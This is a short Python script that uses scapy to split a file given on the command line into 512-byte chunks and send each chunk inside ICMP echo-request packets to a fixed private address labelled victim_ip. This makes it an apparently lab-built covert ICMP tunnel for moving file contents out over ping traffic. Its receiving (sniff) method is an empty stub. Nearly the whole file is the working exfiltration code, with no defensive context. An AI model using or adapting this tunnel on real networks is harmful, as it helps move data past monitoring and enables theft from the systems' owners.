from scapy.all import ICMP, IP, send

import os
import sys
import threading
import time

MAX = 512


class ICMPTunneler:
    def __init__(self, victim_ip: str, data: bytes = b"abcdef") -> None:
        self.victim_ip = victim_ip
        self.data = data

    def send(self):
        ip = IP(dst=self.victim_ip)
        icmp = ICMP(type=8, code=0)

        packet = ip / icmp / self.data
        packet.show()

        send(packet)

    def sniff(self):
        pass

    def run(self, must_sniff: bool = True):
        self.send_thread = threading.Thread(target=self.send)
        self.send_thread.start()

        if must_sniff:
            self.sniff_thread = threading.Thread(target=self.sniff)
            self.sniff_thread.start()


def main():
    icmp_tunneler = ICMPTunneler("192.168.56.103")
    file_path = sys.argv[1]

    with open(file_path, "rb") as file:
        file_size = os.path.getsize(file_path)

        while file_size > 0:
            buffer = file.read(MAX)
            file_size -= MAX

            icmp_tunneler.data = buffer
            icmp_tunneler.run()

            time.sleep(2)


if __name__ == "__main__":
    main()
